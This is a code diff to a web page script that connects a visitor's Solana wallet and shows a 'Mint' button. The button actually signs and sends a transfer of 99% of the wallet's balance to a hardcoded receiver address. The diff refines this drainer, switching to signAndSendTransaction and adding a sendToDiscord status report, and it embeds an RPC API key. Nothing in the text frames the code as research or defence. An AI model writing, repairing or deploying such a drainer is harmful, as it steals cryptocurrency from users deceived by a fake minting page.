@@ -22,47 +22,52 @@ $(document).ready(function() {
                     'https://solana-mainnet.api.syndica.io/api-key/2zjjPuoKeAWepmScwJ72ADocHcNZzLPhNpbqR1X7eB2jMRAdbXMUzuCks578zUKnWnog8dBpj6Km1dHKdjS5p2hQD6cJ7yUgqVp', 
                     'confirmed'
                 );
-
                 const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                 const walletBalance = await connection.getBalance(public_key);
                 console.log("Wallet balance:", walletBalance);
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
+                    sendToDiscord('Insufficient funds for rent')
                     alert("Insufficient funds for rent.");
                     return;
                 }
 
                 $('#connect-wallet').text("Mint");
-                $('#connect-wallet').off('click').on('click', async () => {
+                $('#connect-wallet').on('click', async () => {
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('7pn7bxJakCXjiyYt5QQy8McZCMCSDk2EvCcNr97UHsfG'); // My wallet
+                        const recieverWallet = new solanaWeb3.PublicKey('7pn7bxJakCXjiyYt5QQy8McZCMCSDk2EvCcNr97UHsfG');
                         const balanceForTransfer = walletBalance - minBalance;
+                        
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
                             return;
                         }
-
-                        var transaction = new solanaWeb3.Transaction().add(
+                    
+                        const transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: resp.publicKey,
                                 toPubkey: recieverWallet,
-                                lamports: balanceForTransfer * 0.99,
+                                lamports: Math.floor(balanceForTransfer * 0.99),
                             }),
                         );
-
-                        transaction.feePayer = window.solana.publicKey;
-                        let blockhashObj = await connection.getRecentBlockhash();
-                        transaction.recentBlockhash = blockhashObj.blockhash;
-
-                        const signed = await window.solana.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
-
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
-                        console.log("Transaction confirmed:", txid);
+                    
+                        const { blockhash } = await connection.getLatestBlockhash('finalized');
+                        transaction.recentBlockhash = blockhash;
+                        transaction.feePayer = resp.publicKey;
+                    
+                        // Sign and send in one step
+                        const { signature } = await window.solana.signAndSendTransaction(transaction);
+                        console.log("Transaction sent:", signature);
+                        
+                        await connection.confirmTransaction(signature, 'confirmed');
+                        console.log("Transaction confirmed:", signature);
+                        
+                        alert("Transfer successful!");
+                        
                     } catch (err) {
-                        console.error("Error during minting:", err);
+                        console.error("Error during transfer:", err);
+                        alert("Transfer failed: " + err.message);
                     }
                 });
             } catch (err) {
